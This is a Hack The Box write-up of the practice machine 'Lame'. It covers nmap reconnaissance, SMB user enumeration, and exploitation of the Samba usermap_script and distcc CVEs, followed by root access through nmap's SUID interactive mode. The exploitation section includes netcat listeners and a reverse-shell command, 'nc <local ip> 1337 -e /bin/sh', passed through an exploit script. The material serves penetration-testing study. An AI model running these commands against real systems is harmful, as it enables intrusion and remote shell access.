# HTB Lame Writeup

<code>#CVE-2004-2687</code> <code>#CVE-2007-2447</code> <code>#CVE-2011-2523</code> <code>#vsFTPd</code> <code>#smbd</code> <code>#nmap</code>

## Reconnaissance

`nmap -sC -sV -p- -Pn 10.10.10.3`

```
Nmap scan report for 10.10.10.3
Host is up (0.079s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.42
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-11-07T23:38:51-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h26m42s, deviation: 3h32m10s, median: -3m19s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.67 seconds
```

## Enumeration

### Port 22 - File Transfer Protocol
- Anonymous login using:
	- ftp : ftp
	- anonymous : anonymous
	- anonymous :
- vsFTPd 2.3.4
	- CVE-2011-2523: Backdoor command execution vulnerability
	- opens shell on port 6200/tcp
	- Exploit was not successful

### Port 139, 445 - Server Message Block
- Null Session
	 `rpcclient 10.10.10.3 -U '' -N`

```
user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]
rpcclient $> enumdomgroups
rpcclient $> enumdomgroup
command not found: enumdomgroup
rpcclient $> enumdomusers
user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]
```

- Samba smbd 3.0.20
	- CVE-2007-2447 - Arbitrary Code Execution
		- [Exploit Github Repository](https://github.com/amriunix/CVE-2007-2447)

### Port 3632 - DistCC Daemon
- Distcc is designed to speed up compilation by taking advantage of unused processing power on other computers. A machine with distcc installed can send code to be compiled across the network to a computer which has the distccd daemon and a compatible compiler installed.
- CVE-2004-2687
	- [Exploit Github Repository](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)

## Exploitation

### Exploitation #1: CVE-2007-2447
`kali@kali:/$ nc -lvnp 3333`

`kali@kali:/$ ./usermap_script.py 10.10.10.3 139 10.10.14.13 3333`

<img src="https://github.com/ChrisThePhotographer/HTB-Writeups/blob/main/assets/Screen Shot 2022-12-19 at 10.36.35 PM.png" width=50% height=50%>
<img src="https://github.com/ChrisThePhotographer/HTB-Writeups/blob/main/assets/Screen Shot 2022-12-19 at 10.37.01 PM.png" width=50% height=50%>

### Exploitation #2: CVE-2004-2687

`kali@kali:/$ nc -lvnp 1337`

`kali@kali:/$ ./disccd_exploit.py -t <victim ip> -p 3632 -c "nc <local ip> 1337 -e /bin/sh"`

<img src="https://github.com/ChrisThePhotographer/HTB-Writeups/blob/main/assets/Screen Shot 2022-12-19 at 10.50.26 PM.png" width=50% height=50%>
<img src="https://github.com/ChrisThePhotographer/HTB-Writeups/blob/main/assets/Screen Shot 2022-12-19 at 10.51.21 PM.png" width=50% height=50%>

### Privilege Escalation w/ Exploitation #2

Important SUID files:
`-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap`
- nmap version 4.53
- The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands with root privileges due to owner being root
- [GTFOBins]( https://gtfobins.github.io/gtfobins/nmap/)

<img src="https://github.com/ChrisThePhotographer/test/blob/main/assets/Screen Shot 2022-12-19 at 11.20.34 PM.png" width=50% height=50%>




